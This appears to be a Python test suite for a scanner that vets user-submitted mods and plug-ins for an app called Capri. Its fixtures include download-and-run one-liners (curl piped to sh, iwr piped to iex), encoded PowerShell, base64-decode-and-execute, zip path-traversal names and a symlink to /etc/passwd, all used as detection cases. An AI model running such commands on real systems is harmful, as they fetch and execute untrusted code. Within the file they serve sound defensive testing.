"""Tests for tools/check-mods.py. Each mod is a small fixture built in a temp dir."""
import importlib.util, io, json, os, stat, subprocess, tempfile, unittest, zipfile

spec = importlib.util.spec_from_file_location('check_mods', os.path.join(os.path.dirname(os.path.abspath(__file__)), 'check-mods.py'))
check = importlib.util.module_from_spec(spec)
spec.loader.exec_module(check)

FAKE_KEY = 'sk-ant-' + 'a' * 24


def plugin(servers=None, extra=None, entries=None, plugin_json=True):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        if plugin_json:
            zf.writestr('.claude-plugin/plugin.json', json.dumps({'name': 'demo', 'version': '1.0.0'}))
        if servers is not None:
            zf.writestr('.mcp.json', json.dumps({'mcpServers': servers}))
        zf.writestr('skills/demo/SKILL.md', '# demo\n')
        for name, data in (extra or {}).items():
            zf.writestr(name, data)
        for name, data in (entries or []):
            zf.writestr(name, data)
    return buffer.getvalue()


def made(entries):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for name, data in entries:
            zf.writestr(name, data)
    return buffer.getvalue()


def manifest(**more):
    return json.dumps(dict({'name': 'demo', 'version': '1.0.0'}, **more))


UNPINNED = {'s': {'command': 'npx', 'args': ['-y', 'pkg']}}


class CheckTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        check.root = self.tmp.name

    def run_mod(self, file, data):
        folder = 'demo'
        os.makedirs(os.path.join(self.tmp.name, folder), exist_ok=True)
        with open(os.path.join(self.tmp.name, folder, file), 'wb') as f:
            f.write(data if isinstance(data, bytes) else data.encode())
        return check.check_folder(folder)

    def rules(self, result):
        return [rule for rule, why in result.fails]

    def assertPasses(self, result):
        self.assertEqual(result.fails, [])

    def server(self, command, args=None, **more):
        return plugin({'demo': dict({'command': command, 'args': args or []}, **more)})

    def test_plain_code_passes(self):
        self.assertPasses(self.run_mod('a.capri-code', '// capri-mod: 1\nclass A {}\n'))

    def test_code_over_one_megabyte(self):
        result = self.run_mod('a.capri-code', b'// capri-mod: 1\n' + b'x ' * 524288)
        self.assertIn('code mod too big', self.rules(result))

    def test_code_at_limit_passes(self):
        self.assertPasses(self.run_mod('a.capri-code', b'a ' * 524288))

    def test_packs_and_loads_fails(self):
        result = self.run_mod('a.capri-code', 'Convert.FromBase64String(x); Assembly.Load(b);')
        self.assertIn("the code you can read isn't the code that would run", self.rules(result))

    def test_packs_alone_only_warns(self):
        result = self.run_mod('a.capri-code', 'Convert.FromBase64String(x);')
        self.assertPasses(result)
        self.assertIn('unpacks hidden text', result.warns)

    def test_loads_alone_only_warns(self):
        result = self.run_mod('a.capri-code', 'Assembly.Load(b);')
        self.assertPasses(result)
        self.assertIn('loads code while it runs', result.warns)

    def test_secret_in_each_kind(self):
        for file in ('a.capri-code', 'a.capri-mod', 'a.capri-skill'):
            result = self.run_mod(file, 'key = ' + FAKE_KEY)
            self.assertIn('a key is written into the mod', self.rules(result), file)
            self.assertNotIn(FAKE_KEY, repr(result.fails))

    def test_secret_inside_plugin_file(self):
        result = self.run_mod('demo.capri-plugin', plugin({}, {'notes.txt': FAKE_KEY}))
        self.assertIn('a key is written into the mod', self.rules(result))

    def test_secret_inside_skin_zip(self):
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr('notes.txt', 'ghp_' + 'b' * 30)
        result = self.run_mod('a.capri-skin', buffer.getvalue())
        self.assertIn('a key is written into the mod', self.rules(result))

    def test_settings_mod_passes(self):
        self.assertPasses(self.run_mod('a.capri-mod', json.dumps({'format': 1, 'name': 'x'})))

    def test_plugin_valid_passes(self):
        servers = {'fs': {'command': 'npx', 'args': ['-y', '@modelcontextprotocol/server-filesystem@2025.8.21']},
                   'time': {'command': 'uvx', 'args': ['mcp-server-time==0.6.2']}}
        self.assertPasses(self.run_mod('demo.capri-plugin', plugin(servers)))

    def test_plugin_not_a_zip(self):
        self.assertIn("plug-in isn't a valid zip", self.rules(self.run_mod('demo.capri-plugin', b'not a zip')))

    def test_plugin_zip_over_one_megabyte(self):
        data = os.urandom(1100000)
        result = self.run_mod('demo.capri-plugin', plugin({}, {'blob.bin': data}))
        self.assertIn('plug-in zip limits', self.rules(result))

    def test_plugin_too_many_entries(self):
        result = self.run_mod('demo.capri-plugin', plugin({}, entries=[('f%d.txt' % i, 'x') for i in range(401)]))
        self.assertIn('plug-in zip limits', self.rules(result))

    def test_plugin_unpacks_over_eight_megabytes(self):
        entries = [('big%d.txt' % i, b'0' * (3 * 1024 * 1024)) for i in range(3)]
        result = self.run_mod('demo.capri-plugin', plugin({}, entries=entries))
        self.assertIn('plug-in zip limits', self.rules(result))

    def test_plugin_single_file_over_four_megabytes(self):
        result = self.run_mod('demo.capri-plugin', plugin({}, {'one.txt': b'0' * (4 * 1024 * 1024 + 1)}))
        self.assertIn('plug-in zip limits', self.rules(result))

    def test_plugin_bad_entry_names(self):
        for name in ('/abs.txt', 'c:evil.txt', 'a/../b.txt'):
            result = self.run_mod('demo.capri-plugin', plugin({}, entries=[(name, 'x')]))
            self.assertIn('plug-in zip limits', self.rules(result), name)

    def test_encoded_powershell(self):
        for command, args in (('powershell.exe', ['-EncodedCommand', 'abc']), ('pwsh', ['-enc', 'abc']),
                              ('powershell', ['/ec', 'abc']), ('pwsh', ['-e', 'abc']), ('cmd', ['/c', 'powershell', '-ec', 'x'])):
            result = self.run_mod('demo.capri-plugin', self.server(command, args))
            self.assertIn('encoded PowerShell', self.rules(result), command + str(args))

    def test_plain_powershell_passes(self):
        self.assertPasses(self.run_mod('demo.capri-plugin', self.server('pwsh', ['-File', 'run.ps1'])))

    def test_download_and_run(self):
        for command, args in (('sh', ['-c', 'curl https://x.example/a | sh']), ('bash', ['-c', 'wget -O a https://x && chmod +x a']),
                              ('powershell', ['-Command', 'iwr https://x | iex'])):
            result = self.run_mod('demo.capri-plugin', self.server(command, args))
            self.assertIn('downloads and runs', self.rules(result), command)

    def test_download_without_run_passes(self):
        self.assertPasses(self.run_mod('demo.capri-plugin', self.server('curl', ['-o', 'a.txt', 'https://x.example/a.txt'])))

    def test_unpack_and_run(self):
        result = self.run_mod('demo.capri-plugin', self.server('sh', ['-c', 'echo aGk= | base64 -d | sh']))
        self.assertIn('unpacks and runs', self.rules(result))

    def test_unpinned_runners(self):
        for command, args in (('npx', ['-y', '@modelcontextprotocol/server-filesystem']), ('npx.cmd', ['some-pkg']),
                              ('uvx', ['mcp-server-time']), ('bunx', ['pkg@latest']), ('pnpx', ['pkg']),
                              ('uvx', ['--from', 'mcp-server-time', 'mcp-server-time'])):
            result = self.run_mod('demo.capri-plugin', self.server(command, args))
            self.assertIn('unpinned package', self.rules(result), command + str(args))

    def test_pinned_runners_pass(self):
        for command, args in (('npx', ['-y', 'pkg@1.2.3']), ('bunx', ['pkg@1.0.0-beta.1']), ('uvx', ['--from', 'pkg==1.0', 'tool']),
                              ('npx', ['-y', '-p', 'pkg@2.0.0', 'tool'])):
            self.assertPasses(self.run_mod('demo.capri-plugin', self.server(command, args)))

    def test_secret_env_names_warn(self):
        result = self.run_mod('demo.capri-plugin', self.server('node', ['server.js'], env={'API_KEY': '${MY_API_KEY}', 'HOME': '${CLAUDE_PLUGIN_ROOT}'}))
        self.assertPasses(result)
        self.assertEqual(len([w for w in result.warns if 'MY_API_KEY' in w]), 1)
        self.assertFalse([w for w in result.warns if 'CLAUDE_PLUGIN_ROOT' in w])

    def test_plugin_named_after_its_id(self):
        self.assertIn('plug-in file name', self.rules(self.run_mod('a.capri-plugin', plugin({}))))

    def test_plugin_without_a_name_goes_by_its_file(self):
        self.assertPasses(self.run_mod('my-tools.capri-plugin', made([('.mcp.json', json.dumps({'mcpServers': {}})), ('SKILL.md', '# x')])))

    def test_plugin_starter_id(self):
        data = made([('.claude-plugin/plugin.json', json.dumps({'name': 'Notion'})), ('skills/a/SKILL.md', '# a')])
        self.assertIn('plug-in id', self.rules(self.run_mod('notion.capri-plugin', data)))

    def test_plugin_permissions(self):
        good = made([('plugin.json', manifest(capri={'permissions': ['network', 'Files', 'send', 'pay', 'apps', 'accounts']})), ('SKILL.md', '# a')])
        self.assertPasses(self.run_mod('demo.capri-plugin', good))
        for bad in (['network', 'root'], [3]):
            data = made([('plugin.json', manifest(capri={'permissions': bad})), ('SKILL.md', '# a')])
            self.assertIn('unknown plug-in permission', self.rules(self.run_mod('demo.capri-plugin', data)), bad)

    def test_plugin_server_rules(self):
        cases = ({'s%d' % i: {'command': 'node', 'args': ['a.js']} for i in range(5)},
                 {'bad/name': {'command': 'node'}},
                 {'s': {'command': 'node', 'env': {'1BAD': 'x'}}},
                 {'s': {'command': 'node', 'env': {'A': 1}}},
                 {'s': {'command': 'node', 'args': [{'x': 1}]}},
                 {'s': {'command': 'node', 'args': [None]}},
                 {'s': {'url': 'https://mcp.example.com/mcp', 'headers': {'Host': 'x'}}},
                 {'s': {'url': 'https://mcp.example.com/mcp', 'headers': {'X-A': 1}}},
                 {'s': {'url': 'https://mcp.example.com/mcp', 'headers': {'X-%d' % i: 'v' for i in range(17)}}},
                 {'s': {'type': 'capri', 'builtin': 'Bad Name'}})
        for servers in cases:
            self.assertIn('plug-in servers', self.rules(self.run_mod('demo.capri-plugin', plugin(servers))), servers)
        fine = {'a': {'command': 'node', 'args': ['a.js', 3, True], 'env': {'MODE': 'x'}},
                'b': {'type': 'http', 'url': 'https://mcp.example.com/mcp', 'headers': {'X-Mode': 'x'}},
                'c': {'type': 'capri', 'builtin': 'mail'}, 'd': {'type': 'sse', 'url': 'http://localhost:8080/sse'}}
        result = self.run_mod('demo.capri-plugin', plugin(fine))
        self.assertPasses(result)
        self.assertIn("server `c` uses Capri's own `mail` tools", result.warns)

    def test_plugin_left_out_servers(self):
        data = made([('.mcp.json', json.dumps({'mcpServers': {'web': {'url': 'http://mcp.example.com/mcp'}, 'odd': {'type': 'ws', 'url': 'wss://x'}}}))])
        result = self.run_mod('my-tools.capri-plugin', data)
        self.assertIn('plug-in has nothing Capri can use', self.rules(result))
        self.assertIn("leaves out server `web`, at an address that isn't https", result.warns)
        self.assertIn("leaves out server `odd`, a kind Capri doesn't use", result.warns)

    def test_plugin_nothing_usable(self):
        data = made([('.claude-plugin/plugin.json', manifest()), ('README.md', '# demo')])
        self.assertIn('plug-in has nothing Capri can use', self.rules(self.run_mod('demo.capri-plugin', data)))

    def test_plugin_skills(self):
        many = [('skills/s%d/SKILL.md' % i, '# s') for i in range(21)]
        self.assertIn('plug-in skills', self.rules(self.run_mod('demo.capri-plugin', made([('plugin.json', manifest())] + many))))
        big = [('plugin.json', manifest()), ('skills/a/SKILL.md', 'x' * (64 * 1024 + 1))]
        self.assertIn('plug-in skills', self.rules(self.run_mod('demo.capri-plugin', made(big))))
        listed = [('plugin.json', manifest(skills=['./more'])), ('more/a/SKILL.md', '# a')]
        self.assertPasses(self.run_mod('demo.capri-plugin', made(listed)))
        outside = [('plugin.json', manifest(skills=['../more'])), ('more/a/SKILL.md', '# a')]
        self.assertIn('plug-in has nothing Capri can use', self.rules(self.run_mod('demo.capri-plugin', made(outside))))

    def test_plugin_servers_wherever_capri_reads_them(self):
        servers = json.dumps({'mcpServers': UNPINNED})
        for entries in ([('.mcp.json', b'\xef\xbb\xbf' + servers.encode())],
                        [('.mcp.json', servers.encode('utf-16'))],
                        [('mcp.json', servers)],
                        [('.mcp.json', json.dumps({'servers': UNPINNED}))],
                        [('.mcp.json', json.dumps(UNPINNED))],
                        [('capri-plugin.json', json.dumps({'name': 'demo', 'mcpServers': UNPINNED}))],
                        [('plugin.json', json.dumps({'name': 'demo', 'mcpServers': 'config/servers.json'})), ('config/servers.json', servers)],
                        [('plugin.json', json.dumps({'name': 'demo', 'mcpServers': '${CLAUDE_PLUGIN_ROOT}/s.json'})), ('s.json', servers)],
                        [('.mcp.json', servers.replace('"pkg"', '"pkg\t"').replace('\\t', chr(9)))],
                        [('demo/.mcp.json', servers), ('demo/plugin.json', manifest())],
                        [('vendor/x/.mcp.json', servers), ('plugin.json', manifest()), ('SKILL.md', '# a')]):
            self.assertIn('unpinned package', self.rules(self.run_mod('demo.capri-plugin', made(entries))), entries[0][0])

    def test_plugin_json_tricks(self):
        repeated = '{"mcpServers": {"s": {"command": "node"}}, "mcpServers": {"s": {"command": "npx", "args": ["pkg"]}}}'
        for entries in ([('.mcp.json', repeated)], [('.mcp.json', '{"mcpServers": {')], [('plugin.json', '[1, 2]')],
                        [('plugin.json', json.dumps({'name': 'demo', 'mcpServers': 3})), ('SKILL.md', '# a')]):
            rules = self.rules(self.run_mod('demo.capri-plugin', made(entries)))
            self.assertTrue('plug-in JSON' in rules or 'plug-in servers' in rules, entries)

    def test_plugin_server_file_paths(self):
        for path in ('../s.json', '${HOME}/s.json', '/etc/s.json', 'missing.json'):
            data = made([('plugin.json', json.dumps({'name': 'demo', 'mcpServers': path})), ('s.json', json.dumps({'mcpServers': {}})), ('SKILL.md', '# a')])
            self.assertIn('plug-in servers', self.rules(self.run_mod('demo.capri-plugin', data)), path)

    def test_plugin_entry_tricks(self):
        link = zipfile.ZipInfo('skills/a/SKILL.md')
        link.external_attr = (stat.S_IFLNK | 0o777) << 16
        for entries in ([(link, '/etc/passwd')], [('Notes.txt', 'a'), ('notes.txt', 'b')], [('\\abs.txt', 'x')]):
            data = made([('plugin.json', manifest()), ('SKILL.md', '# a')] + entries)
            self.assertIn('plug-in zip limits', self.rules(self.run_mod('demo.capri-plugin', data)), str(entries[0][0]))

    def test_report_is_plain(self):
        result = check.Result('demo')
        result.fail('rule', 'name `x\n::error::y` and ##[group] and caf\u00e9')
        text = check.report([result])
        self.assertFalse([line for line in text.splitlines() if line.startswith('::') or line.startswith('##[')])
        self.assertNotIn('::error::', text)
        self.assertNotIn('##[group]', text)
        self.assertTrue(all(ord(c) < 128 for c in text))

    def test_code_warnings_and_hosts(self):
        code = 'new HttpClient().GetAsync("https://api.example.com/x"); Process.Start(a); var u = "http://localhost:1/";'
        result = self.run_mod('a.capri-code', code)
        self.assertPasses(result)
        for label in ('uses the network', 'starts programs', 'contacts api.example.com'):
            self.assertIn(label, result.warns)
        self.assertNotIn('contacts api.example.com, localhost', result.warns)

    def test_settings_folder_warning(self):
        result = self.run_mod('a.capri-code', r'Path.Combine(appdata, "Capri", "x") // %APPDATA%\Capri\keys')
        self.assertIn(check.capri_folder_words, result.warns)

    def test_unreadable_code_warning(self):
        result = self.run_mod('a.capri-code', 'var a = "' + 'A' * 900 + '";')
        self.assertIn('code that is hard to read', result.warns)

    def test_report_and_exit_code(self):
        self.run_mod('a.capri-code', 'Convert.FromBase64String(x); Assembly.Load(b);')
        out = os.path.join(self.tmp.name, 'summary.md')
        os.environ['GITHUB_STEP_SUMMARY'] = out
        self.addCleanup(os.environ.pop, 'GITHUB_STEP_SUMMARY')
        stdout, check.sys.stdout = check.sys.stdout, io.StringIO()
        try:
            code = check.main(['check-mods.py', 'demo'])
            printed = check.sys.stdout.getvalue()
        finally:
            check.sys.stdout = stdout
        self.assertEqual(code, 1)
        self.assertIn('**FAIL**', printed)
        with open(out, encoding='utf-8') as f:
            self.assertEqual(f.read(), printed)


class GitModeTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.repo = self.tmp.name
        self.saved = check.here, check.root
        check.here, check.root = self.repo, os.path.join(self.repo, 'mods')
        self.addCleanup(lambda: setattr(check, 'here', self.saved[0]) or setattr(check, 'root', self.saved[1]))
        self.git('init', '-q')
        self.write('good', 'a.capri-code', 'class A {}')
        self.write('gone', 'a.capri-code', 'class B {}')
        self.write('same', 'a.capri-code', 'class C {}')
        self.parent = self.commit('first')

    def git(self, *args):
        env = dict(os.environ, GIT_AUTHOR_NAME='t', GIT_AUTHOR_EMAIL='t@t', GIT_COMMITTER_NAME='t', GIT_COMMITTER_EMAIL='t@t')
        return subprocess.run(['git', '-C', self.repo] + list(args), check=True, capture_output=True, env=env, encoding='utf-8').stdout.strip()

    def write(self, folder, file, data):
        os.makedirs(os.path.join(self.repo, 'mods', folder), exist_ok=True)
        with open(os.path.join(self.repo, 'mods', folder, file), 'wb') as f:
            f.write(data if isinstance(data, bytes) else data.encode())

    def commit(self, message):
        self.git('add', '-A')
        self.git('commit', '-q', '-m', message)
        return self.git('rev-parse', 'HEAD')

    def run_main(self, *args):
        stdout, check.sys.stdout = check.sys.stdout, io.StringIO()
        try:
            code = check.main(['check-mods.py'] + list(args))
            return code, check.sys.stdout.getvalue()
        finally:
            check.sys.stdout = stdout

    def test_two_revisions_read_from_git_not_disk(self):
        self.write('bad', 'a.capri-code', 'Convert.FromBase64String(x); Assembly.Load(b);')
        self.write('good', 'preview.png', b'x' * (2 * 1024 * 1024 + 1))
        commit = self.commit('add')
        self.git('checkout', '-q', self.parent)
        self.assertFalse(os.path.exists(os.path.join(self.repo, 'mods', 'bad')))
        code, out = self.run_main(self.parent, commit)
        self.assertEqual(code, 1)
        self.assertIn('Mod checks: 2 to fix', out)
        self.assertIn('`bad`', out)
        self.assertIn('preview picture too big', out)
        self.assertNotIn('`same`', out)

    def test_clean_change_passes_and_deleted_folder_skipped(self):
        self.write('good', 'a.capri-code', 'class A { int x; }')
        self.git('rm', '-q', '-r', 'mods/gone')
        code, out = self.run_main(self.parent, self.commit('edit'))
        self.assertEqual(code, 0)
        self.assertIn('Checked 1 mod folder:', out)
        self.assertIn('Mod checks: 0 to fix', out)

    def test_changed_uses_head(self):
        self.write('bad', 'a.capri-mod', 'key ' + FAKE_KEY)
        self.commit('add')
        code, out = self.run_main('--changed', self.parent)
        self.assertEqual(code, 1)
        self.assertIn('a key is written into the mod', out)
        self.assertNotIn(FAKE_KEY, out)

    def test_link_in_a_mod_folder(self):
        target = os.path.join(self.tmp.name, 'target.txt')
        with open(target, 'w') as f:
            f.write('../../secret')
        sha = self.git('hash-object', '-w', target)
        self.git('update-index', '--add', '--cacheinfo', '120000,' + sha + ',mods/linky/linky.capri-mod')
        self.git('commit', '-q', '-m', 'link')
        code, out = self.run_main(self.parent, self.git('rev-parse', 'HEAD'))
        self.assertEqual(code, 1)
        self.assertIn('a link in the mod folder', out)

    def test_plugin_read_from_git(self):
        self.write('plug', 'demo.capri-plugin', plugin({'s': {'command': 'npx', 'args': ['pkg']}}))
        code, out = self.run_main(self.parent, self.commit('plug'))
        self.assertEqual(code, 1)
        self.assertIn('unpinned package', out)


if __name__ == '__main__':
    unittest.main()
